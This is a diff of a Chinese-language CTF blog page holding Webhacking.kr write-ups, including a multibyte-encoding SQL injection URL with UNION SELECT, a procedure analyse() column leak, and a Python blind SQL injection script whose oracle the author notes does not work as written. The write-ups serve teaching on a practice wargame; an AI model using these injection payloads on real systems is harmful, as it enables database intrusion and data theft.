@@ -626,6 +626,125 @@ payload 中的 <code>#</code> 编码为
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-50/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-50/" class="post-title-link" itemprop="url">Webhacking.kr old-50</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-26 14:03:08" itemprop="dateCreated datePublished" datetime="2026-09-26T14:03:08+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>283</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Use the encoding boundary to reach a UNION result with level 3.</p>
+<p>利用编码边界注入 UNION 结果，使 level 变成 3。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>old-50 的 <code>id</code> 会先经过 <code>addslashes</code>，之后再从
+EUC-KR 转换为 UTF-8。<code>%aa</code>
+是多字节字符的前导字节；在该转换边界下，它可以吞掉
+<code>addslashes</code> 插入的反斜杠，使后面的单引号重新成为 SQL
+语法的一部分。</p>
+<p><code>pw</code> 从注释结束处开始注入
+<code>UNION SELECT 3</code>。Tab（<code>%09</code>）代替空格，<code>#</code>（<code>%23</code>）注释掉后续
+SQL。这个链依赖原始请求中的字节顺序，浏览器或 HTTP
+客户端不能把已经编码的
+<code>%aa</code>、<code>%27</code>、<code>%2f</code>、<code>%2a</code>
+再编码成字面量百分号序列。</p>
+<h3 id="solution">Solution</h3>
+<p>候选请求的完整原始 query 为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/?id=%aa%27%2f%2a&amp;pw=%2a%2funion%09select%093%23</span><br></pre></td></tr></table></figure>
+<p>解码后两个参数分别是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=\xaa&#x27;/*</span><br><span class="line">pw=*/union\tselect\t3#</span><br></pre></td></tr></table></figure>
+<p>其中 <code>\xaa</code> 表示原始字节
+<code>0xaa</code>，不是六个普通字符。需要使用 Burp Repeater 或能保留
+query 原始字节的客户端重放请求，不要先把整个 URL
+当作普通参数再次编码。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-51/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -714,131 +833,6 @@ payload 中的 <code>#</code> 编码为
 <p>向 <code>/challenge/bonus-13/</code> 发送完整的 form-urlencoded
 请求：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://webhacking.kr/challenge/bonus-13/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \</span><br><span class="line">  --data <span class="string">&#x27;id=admin&amp;pw=129581926211651571912466741651878684928&#x27;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-55/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-55/" class="post-title-link" itemprop="url">Webhacking.kr old-55</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-09-26 14:03:08" itemprop="dateCreated datePublished" datetime="2026-09-26T14:03:08+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>606</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>2 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Extract the flag from the ranking query.</p>
-<p>通过排行榜查询提取 flag。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-31/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p><code>rank.php</code> 将 <code>score</code>
-拼入查询，并根据查询结果显示两个可区分的排名行。先把结果限制到第三列，再调用
-<code>procedure analyse()</code>，可以得到保存 flag 的列名：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/web-31/rank.php?score=2147483647%20limit%202,1%20procedure%20analyse()</span><br></pre></td></tr></table></figure>
-<p>当前部署返回的列名是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4ssw0rd_1123581321</span><br></pre></td></tr></table></figure>
-<p>接着把 <code>score</code> 设为条件表达式。条件为真时选择已知分数
-<code>1</code> 的行，条件为假时选择 <code>2</code>
-的行；页面中的两行内容就是 boolean oracle。<code>substr</code>
-在当前过滤下不可用，所以用 <code>left</code>。候选前缀转成十六进制后放入
-<code>LIKE 0x&lt;hex-prefix&gt;</code>，既避免引号，也避免候选字符串被重新解释。</p>
-<h3 id="solution">Solution</h3>
-<p>单次字符探测的请求结构如下，其中 <code>N</code> 和
-<code>&lt;hex-prefix&gt;</code> 必须替换为实际值：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20left(p4ssw0rd_1123581321%2CN)%20like%200x&lt;hex-prefix&gt;</span><br></pre></td></tr></table></figure>
-<p>其中 <code>N</code> 是当前前缀长度，<code>&lt;hex-prefix&gt;</code>
-是 <code>FLAG{</code> 加上已恢复字符的 ASCII 十六进制，例如首个前缀
-<code>FLAG{F</code> 应使用：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">464c41477b46</span><br></pre></td></tr></table></figure>
-<p>脚本以 <code>Piterpan</code> 区分查询结果，运行时从环境变量读取
-session cookie。须先验证条件为真、为假时的结果确实可区分。脚本中的
-<code>1 and if(condition,1,2)</code>
-在数值布尔上下文里对两种分支都为真，无法实现上文所述的 1/2
-分流。<code>LIKE</code> 的 <code>_</code>
-也是通配符，且大小写是否可区分取决于 collation。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(<span class="string">&quot;WEBHACKING_BASE&quot;</span>, <span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">ENDPOINT = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/challenge/web-31/rank.php&quot;</span></span><br><span class="line">SESSION_ID = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">COLUMN = <span class="string">&quot;p4ssw0rd_1123581321&quot;</span></span><br><span class="line">TRUE_MARKER = <span class="string">&quot;Piterpan&quot;</span></span><br><span class="line">MAX_LENGTH = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LIKE 的十六进制前缀不需要引号；% 不放入候选集，避免它成为 LIKE 通配符。</span></span><br><span class="line">CHARACTERS = (</span><br><span class="line">    string.ascii_letters</span><br><span class="line">    + string.digits</span><br><span class="line">    + <span class="string">&quot;!\\\&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;old-55-writeup/1.0&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> SESSION_ID:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, SESSION_ID, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">session, expression</span>):</span><br><span class="line">    response = session.get(</span><br><span class="line">        ENDPOINT,</span><br><span class="line">        params=&#123;<span class="string">&quot;score&quot;</span>: expression&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">session, condition</span>):</span><br><span class="line">    <span class="comment"># score=1 is the row identified by TRUE_MARKER; score=2 is the false row.</span></span><br><span class="line">    expression = <span class="string">f&quot;1 and if(<span class="subst">&#123;condition&#125;</span>,1,2)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> TRUE_MARKER <span class="keyword">in</span> query(session, expression)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">discover_length</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> oracle(session, <span class="string">f&quot;length(<span class="subst">&#123;COLUMN&#125;</span>)=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;flag length was not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">session, length</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> CHARACTERS:</span><br><span class="line">            candidate = flag + character</span><br><span class="line">            hex_prefix = candidate.encode(<span class="string">&quot;ascii&quot;</span>).<span class="built_in">hex</span>()</span><br><span class="line">            condition = <span class="string">f&quot;left(<span class="subst">&#123;COLUMN&#125;</span>,<span class="subst">&#123;position&#125;</span>) like 0x<span class="subst">&#123;hex_prefix&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> oracle(session, condition):</span><br><span class="line">                flag = candidate</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = make_session()</span><br><span class="line">    length = discover_length(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;length=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    flag = recover_flag(session, length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag=<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -978,7 +972,7 @@ table 名。</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-50/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-55/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -996,7 +990,7 @@ table 名。</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-50/" class="post-title-link" itemprop="url">Webhacking.kr old-50</a>
+          <a href="/wp/webhacking/old-55/" class="post-title-link" itemprop="url">Webhacking.kr old-55</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1026,14 +1020,14 @@ table 名。</p>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>283</span>
+      <span>606</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>2 mins.</span>
     </span>
 </div>
 
@@ -1046,31 +1040,37 @@ table 名。</p>
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>Use the encoding boundary to reach a UNION result with level 3.</p>
-<p>利用编码边界注入 UNION 结果，使 level 变成 3。</p>
+<p>Extract the flag from the ranking query.</p>
+<p>通过排行榜查询提取 flag。</p>
 </blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-31/</span><br></pre></td></tr></table></figure>
 <h3 id="analysis">Analysis</h3>
-<p>old-50 的 <code>id</code> 会先经过 <code>addslashes</code>，之后再从
-EUC-KR 转换为 UTF-8。<code>%aa</code>
-是多字节字符的前导字节；在该转换边界下，它可以吞掉
-<code>addslashes</code> 插入的反斜杠，使后面的单引号重新成为 SQL
-语法的一部分。</p>
-<p><code>pw</code> 从注释结束处开始注入
-<code>UNION SELECT 3</code>。Tab（<code>%09</code>）代替空格，<code>#</code>（<code>%23</code>）注释掉后续
-SQL。这个链依赖原始请求中的字节顺序，浏览器或 HTTP
-客户端不能把已经编码的
-<code>%aa</code>、<code>%27</code>、<code>%2f</code>、<code>%2a</code>
-再编码成字面量百分号序列。</p>
+<p><code>rank.php</code> 将 <code>score</code>
+拼入查询，并根据查询结果显示两个可区分的排名行。先把结果限制到第三列，再调用
+<code>procedure analyse()</code>，可以得到保存 flag 的列名：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/web-31/rank.php?score=2147483647%20limit%202,1%20procedure%20analyse()</span><br></pre></td></tr></table></figure>
+<p>当前部署返回的列名是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4ssw0rd_1123581321</span><br></pre></td></tr></table></figure>
+<p>接着把 <code>score</code> 设为条件表达式。条件为真时选择已知分数
+<code>1</code> 的行，条件为假时选择 <code>2</code>
+的行；页面中的两行内容就是 boolean oracle。<code>substr</code>
+在当前过滤下不可用，所以用 <code>left</code>。候选前缀转成十六进制后放入
+<code>LIKE 0x&lt;hex-prefix&gt;</code>，既避免引号，也避免候选字符串被重新解释。</p>
 <h3 id="solution">Solution</h3>
-<p>候选请求的完整原始 query 为：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-25/?id=%aa%27%2f%2a&amp;pw=%2a%2funion%09select%093%23</span><br></pre></td></tr></table></figure>
-<p>解码后两个参数分别是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=\xaa&#x27;/*</span><br><span class="line">pw=*/union\tselect\t3#</span><br></pre></td></tr></table></figure>
-<p>其中 <code>\xaa</code> 表示原始字节
-<code>0xaa</code>，不是六个普通字符。需要使用 Burp Repeater 或能保留
-query 原始字节的客户端重放请求，不要先把整个 URL
-当作普通参数再次编码。</p>
+<p>单次字符探测的请求结构如下，其中 <code>N</code> 和
+<code>&lt;hex-prefix&gt;</code> 必须替换为实际值：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20left(p4ssw0rd_1123581321%2CN)%20like%200x&lt;hex-prefix&gt;</span><br></pre></td></tr></table></figure>
+<p>其中 <code>N</code> 是当前前缀长度，<code>&lt;hex-prefix&gt;</code>
+是 <code>FLAG{</code> 加上已恢复字符的 ASCII 十六进制，例如首个前缀
+<code>FLAG{F</code> 应使用：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">464c41477b46</span><br></pre></td></tr></table></figure>
+<p>脚本以 <code>Piterpan</code> 区分查询结果，运行时从环境变量读取
+session cookie。须先验证条件为真、为假时的结果确实可区分。脚本中的
+<code>1 and if(condition,1,2)</code>
+在数值布尔上下文里对两种分支都为真，无法实现上文所述的 1/2
+分流。<code>LIKE</code> 的 <code>_</code>
+也是通配符，且大小写是否可区分取决于 collation。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(<span class="string">&quot;WEBHACKING_BASE&quot;</span>, <span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">ENDPOINT = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/challenge/web-31/rank.php&quot;</span></span><br><span class="line">SESSION_ID = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">COLUMN = <span class="string">&quot;p4ssw0rd_1123581321&quot;</span></span><br><span class="line">TRUE_MARKER = <span class="string">&quot;Piterpan&quot;</span></span><br><span class="line">MAX_LENGTH = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LIKE 的十六进制前缀不需要引号；% 不放入候选集，避免它成为 LIKE 通配符。</span></span><br><span class="line">CHARACTERS = (</span><br><span class="line">    string.ascii_letters</span><br><span class="line">    + string.digits</span><br><span class="line">    + <span class="string">&quot;!\\\&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;old-55-writeup/1.0&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> SESSION_ID:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, SESSION_ID, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">session, expression</span>):</span><br><span class="line">    response = session.get(</span><br><span class="line">        ENDPOINT,</span><br><span class="line">        params=&#123;<span class="string">&quot;score&quot;</span>: expression&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">session, condition</span>):</span><br><span class="line">    <span class="comment"># score=1 is the row identified by TRUE_MARKER; score=2 is the false row.</span></span><br><span class="line">    expression = <span class="string">f&quot;1 and if(<span class="subst">&#123;condition&#125;</span>,1,2)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> TRUE_MARKER <span class="keyword">in</span> query(session, expression)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">discover_length</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> oracle(session, <span class="string">f&quot;length(<span class="subst">&#123;COLUMN&#125;</span>)=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;flag length was not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">session, length</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> CHARACTERS:</span><br><span class="line">            candidate = flag + character</span><br><span class="line">            hex_prefix = candidate.encode(<span class="string">&quot;ascii&quot;</span>).<span class="built_in">hex</span>()</span><br><span class="line">            condition = <span class="string">f&quot;left(<span class="subst">&#123;COLUMN&#125;</span>,<span class="subst">&#123;position&#125;</span>) like 0x<span class="subst">&#123;hex_prefix&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> oracle(session, condition):</span><br><span class="line">                flag = candidate</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = make_session()</span><br><span class="line">    length = discover_length(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;length=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    flag = recover_flag(session, length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag=<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1321,7 +1321,7 @@ admin；<code>LIKE</code> 在这里承担比较作用，避开被过滤的
   
 
